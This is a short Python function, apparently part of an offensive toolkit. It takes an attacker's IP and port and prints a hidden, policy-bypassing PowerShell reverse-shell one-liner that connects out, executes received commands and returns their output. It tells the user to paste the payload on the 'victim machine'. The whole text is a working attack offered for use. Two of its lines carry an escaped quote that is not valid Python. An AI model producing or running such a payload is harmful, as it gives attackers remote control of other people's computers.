def run():
    ip = input("Enter LHOST (your IP): ")
    port = input("Enter LPORT: ")

    payload = (
        f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
        f\"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}}; "
        f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
        f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); "
        f"$sendback = (iex $data 2>&1 | Out-String ); "
        f"$sendback2  = $sendback + 'PS ' + (pwd).Path + '> '; "
        f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); "
        f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}; "
        f"$client.Close()\"
    )

    print("\n[+] Copy & paste this payload on the victim machine:")
    print(payload)